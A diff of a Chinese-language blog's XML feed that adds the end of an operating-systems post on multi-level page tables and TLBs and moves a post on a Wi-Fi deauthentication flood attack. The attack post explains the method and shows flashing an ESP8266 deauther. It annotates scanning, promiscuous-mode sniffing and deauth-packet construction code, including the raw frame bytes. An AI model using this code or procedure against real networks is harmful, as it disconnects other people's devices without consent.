@@ -482,9 +482,104 @@
 <p>计算机内的除4K即右移12位，所有地址后12位是偏移地址，前4位是页号。</p>
 <p>逻辑地址：0x2240，0x2是页号找到页框号（0x3），0x240是页内偏移地址</p>
 <p>得到物理地址：0x3240</p>
-<h2 id="多级页表和快表"><a href="#多级页表和快表" class="headerlink" title="多级页表和快表"></a>多级页表和快表</h2>]]></content>
+<h2 id="多级页表和快表"><a href="#多级页表和快表" class="headerlink" title="多级页表和快表"></a>多级页表和快表</h2><h3 id="页表会很大，页表放置就成了问题"><a href="#页表会很大，页表放置就成了问题" class="headerlink" title="页表会很大，页表放置就成了问题"></a>页表会很大，页表放置就成了问题</h3><p>为了提高空间利用率，页的大小就应该小，但页的表项就会多。</p>
+<ul>
+<li>页大小一般是4k，而地址是32位的，所以由2的20次方个页表现</li>
+<li>这么多页表项，需要4M的内存；当系统中并发10个进程，就需要40M内存</li>
+<li>进程越多，存储页表项需要内存越多，这也是一种内存的浪费</li>
+</ul>
+<p>实际上大部分逻辑地址根本不会用到</p>
+<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/115.png" class="">
+
+<h3 id="第一种尝试，只存放用到的页"><a href="#第一种尝试，只存放用到的页" class="headerlink" title="第一种尝试，只存放用到的页"></a>第一种尝试，只存放用到的页</h3><ul>
+<li>很自然的想法：只有用到的逻辑页才有页表项<ul>
+<li>但页表中的页号不连续，就需要比较、查找 ，浪费时间</li>
+<li>如果页号连续，一次访问就能找到相应的页框号</li>
+</ul>
+</li>
+<li>页号连续，浪费内存。页号不连续，浪费查找时间</li>
+</ul>
+<p>既要连续又要让页表占用内存少，怎么办？</p>
+<h3 id="多级页表，即页目录表-页表"><a href="#多级页表，即页目录表-页表" class="headerlink" title="多级页表，即页目录表 + 页表"></a>多级页表，即页目录表 + 页表</h3><p>​        多个页号放进一个页目录中，这样生成的页表只记录该页目录下的页，就缩小了页表的长度。而这样的一个页表又是连续的，就不需要比较查找。</p>
+<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/116.png" class="">
+
+<p>​        offset指向了一个4k大小的页。而一个页目录下有1024个页。共有1024个页目录。所以一个32位逻辑地址指向了一个4G的空间。</p>
+<h3 id="多级页表提高了空间效率，但在时间？"><a href="#多级页表提高了空间效率，但在时间？" class="headerlink" title="多级页表提高了空间效率，但在时间？"></a>多级页表提高了空间效率，但在时间？</h3><ul>
+<li>多级页表怎加了访问内存的次数<ul>
+<li>每增加一级页表，内存的访问次数就要怎加一次</li>
+<li>访问次数增多，时间效率不高</li>
+</ul>
+</li>
+<li>快表：TLB是一组相联快速存储，是寄存器<ul>
+<li>将最常用的页号存到寄存器中，调用十分迅速</li>
+<li><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/117.png" class="">
+<ul>
+<li>如果命中，可以直接硬件上将逻辑地址转换成物理地址</li>
+<li>如果不命中，就去多级页表中查，然后将这次的存储地址放到快表中（空间局部性好的程序往往查找速度越快）</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>多级页表保证了减少了页表中的页表项，减少了内存损耗。通过快表保证了多次使用的内存，查找速度很快。这样以来，空间时间上都有较高的效率。</li>
+</ul>
+<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/118.png" class="">
+
+<p>​        通过有效访问时间的计算，可以判断一个快表的好坏（后面会有换入和换出算法来更新快表，这种算法越好，快表命中率越高）。而快表越大，命中率也越高，但TLB也越贵。</p>
+]]></content>
       <categories>
         <category>操作系统</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>无线DOS之取消验证洪水攻击</title>
+    <url>/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/</url>
+    <content><![CDATA[<h1 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h1><p>​    取消验证洪水攻击，全程为De-authenticationFloodAttack,简称为Deauth攻击。首先，攻击者通过扫描周围的WIFI网络，获取WIFI站点的SSID。然后扫描连接周围连接该网络的设备。最后，对周边网络进行抓包（嗅探），寻找要攻击的WIFI站点和连接该站点的设备，以获取的包头信息重新构造一个取消验证包，发给连接设备。设备会被欺骗，从而取消对AP的连接。</p>
+<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/0.png" class="">
+
+<h1 id="攻击实现"><a href="#攻击实现" class="headerlink" title="攻击实现"></a>攻击实现</h1><p>​    参考已有的张馆长的工程，将其烧录到esp8266模块上。<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/1.jpg" class=""></p>
+<p>简单配置一下</p>
+<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/2.jpg" class="">
+
+<p>烧录</p>
+<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/3.jpg" class="">
+
+<p>这时，esp8266会建立一个WIFI，</p>
+<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/4.jpg" class="">
+
+<p>我们连接这个wifi，进入192.168.4.1，可以看到攻击界面，里面会显示当前的AP，我们选取一个作为攻击对象。这里我们设置的是无差别攻击。当我们要定点攻击时，需要扫描连接该WiFi的设备，选择一个攻击。</p>
+<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/5.jpg" class="">
+
+<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/6.jpg" class="">
+
+<p>​        选择Deauth攻击，然后我们就可以观察到连接该网的设备断连的现象，手机上方的WiFi图标会不断闪烁。</p>
+<h1 id="代码架构"><a href="#代码架构" class="headerlink" title="代码架构"></a>代码架构</h1><p>首先，WIFI模块有两种工作模式：</p>
+<p>ap是无线发射端，station是接收端，两种模式组建成一个无线局域网。</p>
+<ol>
+<li>ap mode 通常应用在无线局域网成员设备（即客户端）的加入，即<strong>网络下行</strong>。它提供以无线方式组建无线局域网 WLAN，相当际 <strong>WLAN 的中心设备</strong>。AP和AP之间允许相互连接。</li>
+<li>station mode即工作站模式，可以理解为某个网格中的一个工作站即<strong>客户端</strong>，<strong>网络上行</strong>。那当一个 WIFI 芯片提供这个功能时，它就可以连到另外的一个网络当中，如家用路由器。通常用于提供网络的数据上行服务。</li>
+</ol>
+<p>代码的核心是扫描、嗅探和伪造。扫描站点，嗅探（抓包）和通过。</p>
+<p>首先是扫描：</p>
+<p>​    AP模式扫描周围的AP。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#scan.cpp</span></span><br><span class="line">	<span class="comment">/* AP Scan */</span></span><br><span class="line">    <span class="keyword">if</span> ((mode == SCAN_MODE_APS) || (mode == SCAN_MODE_ALL)) &#123;</span><br><span class="line">        <span class="comment">// remove old results</span></span><br><span class="line">        accesspoints.removeAll();</span><br><span class="line">        stations.removeAll();</span><br><span class="line">        <span class="comment">// start AP scan</span></span><br><span class="line">        prntln(SC_START_AP);</span><br><span class="line">        WiFi.scanNetworks(<span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="comment">/*该函数可以扫描到ESP8266开发板所在环境中的可用WIFI网络，并且将WiFi网络信息保存到内存中。通过调用SSID、RSSI等函数，我们还可以得到这些扫描到的WIFI的更多信息。*/</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    station模式开启后可以开启混杂模式（混杂模式（英语：promiscuous mode）是电脑网络中的术语。是指一台机器的网卡能够接收所有经过它的数据流，而不论其目的地址是否是它。），从而为嗅探作准备</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#scan.cpp</span></span><br><span class="line"><span class="comment">/* Station Scan */</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (mode == SCAN_MODE_STATIONS) &#123;</span><br><span class="line">        <span class="comment">// start station scan</span></span><br><span class="line">        <span class="keyword">if</span> (accesspoints.count() &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            start(SCAN_MODE_ALL);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="comment">//如果当前网络没有AP,返回重新扫描，因为我们需要先确定攻击的AP再确定攻击的设备，如果在嗅探前AP已经不存在了，则没有继续的必要</span></span><br><span class="line">        snifferStartTime = currentTime;</span><br><span class="line">        prnt(SC_START_CLIENT);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sniffTime &gt; <span class="number">0</span>) prnt(String(sniffTime / <span class="number">1000</span>) + S);</span><br><span class="line">        <span class="keyword">else</span> prnt(SC_INFINITELY);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!channelHop) &#123;</span><br><span class="line">            prnt(SC_ON_CHANNEL);</span><br><span class="line">            prnt(wifi_channel);</span><br><span class="line">        &#125;</span><br><span class="line">        prntln();</span><br><span class="line">        wifi::stopAP();</span><br><span class="line">        wifi_promiscuous_enable(<span class="literal">true</span>);<span class="comment">//开启混杂模式</span></span><br><span class="line">    	<span class="comment">/*混杂模式就是接收所有经过网卡的数据包，包括不是发给本机的包。默认情况下网卡只把发给本机的包（包括广播包）传递给上层程序，其它的包一律丢弃。但是混杂模式就是指网卡能接受所有通过它的数据流，不管是什么格式，什么地址的。事实上，计算机收到数据包后，由网络层进行判断（这里是802.11系协议），确定是递交上层（传输层），还是丢弃，还是递交下层（数据链路层、MAC子层）转发。*/</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>进入嗅探模式：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Scan::sniffer</span><span class="params">(<span class="keyword">uint8_t</span>* buf, <span class="keyword">uint16_t</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!isSniffing()) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    packets++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len &lt; <span class="number">28</span>) <span class="keyword">return</span>;  <span class="comment">// 丢弃掉过短的数据包</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((buf[<span class="number">12</span>] == <span class="number">0xc0</span>) || (buf[<span class="number">12</span>] == <span class="number">0xa0</span>)) &#123;</span><br><span class="line">        tmpDeauths++;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 丢弃信标帧、探测请求/响应和解除授权/解除关联帧</span></span><br><span class="line">    <span class="keyword">if</span> ((buf[<span class="number">12</span>] == <span class="number">0x80</span>) || (buf[<span class="number">12</span>] == <span class="number">0x40</span>) || (buf[<span class="number">12</span>] == <span class="number">0x50</span>) <span class="comment">/* || buf[12] == 0xc0 || buf[12] == 0xa0*/</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 只允许数据帧</span></span><br><span class="line">    <span class="comment">// if(buf[12] != 0x08 &amp;&amp; buf[12] != 0x88) return;数据帧12位为08和88的时候说明是数据帧，如果都不是，可以丢弃，但作者将这句话注释了，不知道原因。。。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span>* macTo   = &amp;buf[<span class="number">16</span>];<span class="comment">//该数据包要去哪</span></span><br><span class="line">    <span class="keyword">uint8_t</span>* macFrom = &amp;buf[<span class="number">22</span>];<span class="comment">//该数据包从哪来</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (macBroadcast(macTo) || macBroadcast(macFrom) || !macValid(macTo) || !macValid(macFrom) || macMulticast(macTo) ||</span><br><span class="line">        macMulticast(macFrom)) <span class="keyword">return</span>;</span><br><span class="line">	<span class="comment">//Broadcast所谓广播地址指同时向网上所有的主机发送报文，也就是说，不管物理网络特性如何，internet网都支持广播传输。这里表示如果收发地址为广播地址，则丢弃。</span></span><br><span class="line">    <span class="comment">//Multicast是一个群组传播模式。。。其他的看不懂了，和上面区别不大。也丢弃。</span></span><br><span class="line">    <span class="comment">//上面两种的特点都是一对多模式，而我们只需要要截获一对一的数据包，并认为该mac为有效mac地址。</span></span><br><span class="line">    <span class="keyword">int</span> accesspointNum = findAccesspoint(macFrom);<span class="comment">//查看该mac地址有几个AP。这个如果为0说明该mac地址是连接AP的设备</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (accesspointNum &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        stations.add(macTo, accesspoints.getID(accesspointNum));</span><br><span class="line">        <span class="comment">//macForm为AP了，那么macTo肯定为设备，我们将该设备的mac加入列表。</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  <span class="comment">//如果AP数量为0，那么macTo是AP，macForm为设备，</span></span><br><span class="line">        accesspointNum = findAccesspoint(macTo);</span><br><span class="line">        <span class="comment">//这两个if判断谁是AP谁是设备，写的很垃圾</span></span><br><span class="line">        <span class="keyword">if</span> (accesspointNum &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            stations.add(macFrom, accesspoints.getID(accesspointNum));</span><br><span class="line">            <span class="comment">//我们将该设备的mac加入列表。</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="802-11协议"><a href="#802-11协议" class="headerlink" title="802.11协议"></a>802.11协议</h2><img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/7.png" class="">
+
+<p>以上是我们需要构造的mac帧头格式</p>
+<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/8.png" class="">
+
+<p>准确的说，我们需要向设备发送取消验证包。地址1应该是DA（设备mac），地址2是BSSID（伪造成APmac），地址3源地址（还是APmac）</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#attack.cpp</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Attack::deauthDevice</span><span class="params">(<span class="keyword">uint8_t</span>* apMac, <span class="keyword">uint8_t</span>* stMac, <span class="keyword">uint8_t</span> reason, <span class="keyword">uint8_t</span> ch)</span> </span>&#123;</span><br><span class="line">	······</span><br><span class="line">    <span class="comment">// build deauth packet</span></span><br><span class="line">    packetSize = <span class="keyword">sizeof</span>(deauthPacket);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span> deauthpkt[packetSize];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(deauthpkt, deauthPacket, packetSize);<span class="comment">//构造mac帧头，初始数据见下</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;deauthpkt[<span class="number">4</span>], stMac, <span class="number">6</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;deauthpkt[<span class="number">10</span>], apMac, <span class="number">6</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;deauthpkt[<span class="number">16</span>], apMac, <span class="number">6</span>);</span><br><span class="line">    deauthpkt[<span class="number">24</span>] = reason;</span><br><span class="line">    ······</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#attack.h</span></span><br><span class="line"><span class="keyword">uint8_t</span> deauthPacket[<span class="number">26</span>] = &#123;</span><br><span class="line">            <span class="comment">/*  0 - 1  */</span> <span class="number">0xC0</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="comment">/*  2 - 3  */</span> <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">            <span class="comment">/*  4 - 9  */</span> <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>,</span><br><span class="line">            <span class="comment">/* 10 - 15 */</span> <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>,</span><br><span class="line">            <span class="comment">/* 16 - 21 */</span> <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>,</span><br><span class="line">            <span class="comment">/* 22 - 23 */</span> <span class="number">0x00</span>, <span class="number">0x00</span>,                         </span><br><span class="line">            <span class="comment">/* 24 - 25 */</span> <span class="number">0x01</span>, <span class="number">0x00</span>                         </span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>软件安全</category>
       </categories>
   </entry>
   <entry>
@@ -1120,58 +1215,6 @@
       </categories>
   </entry>
   <entry>
-    <title>无线DOS之取消验证洪水攻击</title>
-    <url>/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/</url>
-    <content><![CDATA[<h1 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h1><p>​    取消验证洪水攻击，全程为De-authenticationFloodAttack,简称为Deauth攻击。首先，攻击者通过扫描周围的WIFI网络，获取WIFI站点的SSID。然后扫描连接周围连接该网络的设备。最后，对周边网络进行抓包（嗅探），寻找要攻击的WIFI站点和连接该站点的设备，以获取的包头信息重新构造一个取消验证包，发给连接设备。设备会被欺骗，从而取消对AP的连接。</p>
-<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/0.png" class="">
-
-<h1 id="攻击实现"><a href="#攻击实现" class="headerlink" title="攻击实现"></a>攻击实现</h1><p>​    参考已有的张馆长的工程，将其烧录到esp8266模块上。<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/1.jpg" class=""></p>
-<p>简单配置一下</p>
-<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/2.jpg" class="">
-
-<p>烧录</p>
-<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/3.jpg" class="">
-
-<p>这时，esp8266会建立一个WIFI，</p>
-<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/4.jpg" class="">
-
-<p>我们连接这个wifi，进入192.168.4.1，可以看到攻击界面，里面会显示当前的AP，我们选取一个作为攻击对象。这里我们设置的是无差别攻击。当我们要定点攻击时，需要扫描连接该WiFi的设备，选择一个攻击。</p>
-<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/5.jpg" class="">
-
-<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/6.jpg" class="">
-
-<p>​        选择Deauth攻击，然后我们就可以观察到连接该网的设备断连的现象，手机上方的WiFi图标会不断闪烁。</p>
-<h1 id="代码架构"><a href="#代码架构" class="headerlink" title="代码架构"></a>代码架构</h1><p>首先，WIFI模块有两种工作模式：</p>
-<p>ap是无线发射端，station是接收端，两种模式组建成一个无线局域网。</p>
-<ol>
-<li>ap mode 通常应用在无线局域网成员设备（即客户端）的加入，即<strong>网络下行</strong>。它提供以无线方式组建无线局域网 WLAN，相当际 <strong>WLAN 的中心设备</strong>。AP和AP之间允许相互连接。</li>
-<li>station mode即工作站模式，可以理解为某个网格中的一个工作站即<strong>客户端</strong>，<strong>网络上行</strong>。那当一个 WIFI 芯片提供这个功能时，它就可以连到另外的一个网络当中，如家用路由器。通常用于提供网络的数据上行服务。</li>
-</ol>
-<p>代码的核心是扫描、嗅探和伪造。扫描站点，嗅探（抓包）和通过。</p>
-<p>首先是扫描：</p>
-<p>​    AP模式扫描周围的AP。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#scan.cpp</span></span><br><span class="line">	<span class="comment">/* AP Scan */</span></span><br><span class="line">    <span class="keyword">if</span> ((mode == SCAN_MODE_APS) || (mode == SCAN_MODE_ALL)) &#123;</span><br><span class="line">        <span class="comment">// remove old results</span></span><br><span class="line">        accesspoints.removeAll();</span><br><span class="line">        stations.removeAll();</span><br><span class="line">        <span class="comment">// start AP scan</span></span><br><span class="line">        prntln(SC_START_AP);</span><br><span class="line">        WiFi.scanNetworks(<span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="comment">/*该函数可以扫描到ESP8266开发板所在环境中的可用WIFI网络，并且将WiFi网络信息保存到内存中。通过调用SSID、RSSI等函数，我们还可以得到这些扫描到的WIFI的更多信息。*/</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>​    station模式开启后可以开启混杂模式（混杂模式（英语：promiscuous mode）是电脑网络中的术语。是指一台机器的网卡能够接收所有经过它的数据流，而不论其目的地址是否是它。），从而为嗅探作准备</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#scan.cpp</span></span><br><span class="line"><span class="comment">/* Station Scan */</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (mode == SCAN_MODE_STATIONS) &#123;</span><br><span class="line">        <span class="comment">// start station scan</span></span><br><span class="line">        <span class="keyword">if</span> (accesspoints.count() &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            start(SCAN_MODE_ALL);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="comment">//如果当前网络没有AP,返回重新扫描，因为我们需要先确定攻击的AP再确定攻击的设备，如果在嗅探前AP已经不存在了，则没有继续的必要</span></span><br><span class="line">        snifferStartTime = currentTime;</span><br><span class="line">        prnt(SC_START_CLIENT);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sniffTime &gt; <span class="number">0</span>) prnt(String(sniffTime / <span class="number">1000</span>) + S);</span><br><span class="line">        <span class="keyword">else</span> prnt(SC_INFINITELY);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!channelHop) &#123;</span><br><span class="line">            prnt(SC_ON_CHANNEL);</span><br><span class="line">            prnt(wifi_channel);</span><br><span class="line">        &#125;</span><br><span class="line">        prntln();</span><br><span class="line">        wifi::stopAP();</span><br><span class="line">        wifi_promiscuous_enable(<span class="literal">true</span>);<span class="comment">//开启混杂模式</span></span><br><span class="line">    	<span class="comment">/*混杂模式就是接收所有经过网卡的数据包，包括不是发给本机的包。默认情况下网卡只把发给本机的包（包括广播包）传递给上层程序，其它的包一律丢弃。但是混杂模式就是指网卡能接受所有通过它的数据流，不管是什么格式，什么地址的。事实上，计算机收到数据包后，由网络层进行判断（这里是802.11系协议），确定是递交上层（传输层），还是丢弃，还是递交下层（数据链路层、MAC子层）转发。*/</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>进入嗅探模式：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Scan::sniffer</span><span class="params">(<span class="keyword">uint8_t</span>* buf, <span class="keyword">uint16_t</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!isSniffing()) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    packets++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len &lt; <span class="number">28</span>) <span class="keyword">return</span>;  <span class="comment">// 丢弃掉过短的数据包</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((buf[<span class="number">12</span>] == <span class="number">0xc0</span>) || (buf[<span class="number">12</span>] == <span class="number">0xa0</span>)) &#123;</span><br><span class="line">        tmpDeauths++;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 丢弃信标帧、探测请求/响应和解除授权/解除关联帧</span></span><br><span class="line">    <span class="keyword">if</span> ((buf[<span class="number">12</span>] == <span class="number">0x80</span>) || (buf[<span class="number">12</span>] == <span class="number">0x40</span>) || (buf[<span class="number">12</span>] == <span class="number">0x50</span>) <span class="comment">/* || buf[12] == 0xc0 || buf[12] == 0xa0*/</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 只允许数据帧</span></span><br><span class="line">    <span class="comment">// if(buf[12] != 0x08 &amp;&amp; buf[12] != 0x88) return;数据帧12位为08和88的时候说明是数据帧，如果都不是，可以丢弃，但作者将这句话注释了，不知道原因。。。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span>* macTo   = &amp;buf[<span class="number">16</span>];<span class="comment">//该数据包要去哪</span></span><br><span class="line">    <span class="keyword">uint8_t</span>* macFrom = &amp;buf[<span class="number">22</span>];<span class="comment">//该数据包从哪来</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (macBroadcast(macTo) || macBroadcast(macFrom) || !macValid(macTo) || !macValid(macFrom) || macMulticast(macTo) ||</span><br><span class="line">        macMulticast(macFrom)) <span class="keyword">return</span>;</span><br><span class="line">	<span class="comment">//Broadcast所谓广播地址指同时向网上所有的主机发送报文，也就是说，不管物理网络特性如何，internet网都支持广播传输。这里表示如果收发地址为广播地址，则丢弃。</span></span><br><span class="line">    <span class="comment">//Multicast是一个群组传播模式。。。其他的看不懂了，和上面区别不大。也丢弃。</span></span><br><span class="line">    <span class="comment">//上面两种的特点都是一对多模式，而我们只需要要截获一对一的数据包，并认为该mac为有效mac地址。</span></span><br><span class="line">    <span class="keyword">int</span> accesspointNum = findAccesspoint(macFrom);<span class="comment">//查看该mac地址有几个AP。这个如果为0说明该mac地址是连接AP的设备</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (accesspointNum &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        stations.add(macTo, accesspoints.getID(accesspointNum));</span><br><span class="line">        <span class="comment">//macForm为AP了，那么macTo肯定为设备，我们将该设备的mac加入列表。</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  <span class="comment">//如果AP数量为0，那么macTo是AP，macForm为设备，</span></span><br><span class="line">        accesspointNum = findAccesspoint(macTo);</span><br><span class="line">        <span class="comment">//这两个if判断谁是AP谁是设备，写的很垃圾</span></span><br><span class="line">        <span class="keyword">if</span> (accesspointNum &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            stations.add(macFrom, accesspoints.getID(accesspointNum));</span><br><span class="line">            <span class="comment">//我们将该设备的mac加入列表。</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="802-11协议"><a href="#802-11协议" class="headerlink" title="802.11协议"></a>802.11协议</h2><img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/7.png" class="">
-
-<p>以上是我们需要构造的mac帧头格式</p>
-<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/8.png" class="">
-
-<p>准确的说，我们需要向设备发送取消验证包。地址1应该是DA（设备mac），地址2是BSSID（伪造成APmac），地址3源地址（还是APmac）</p>
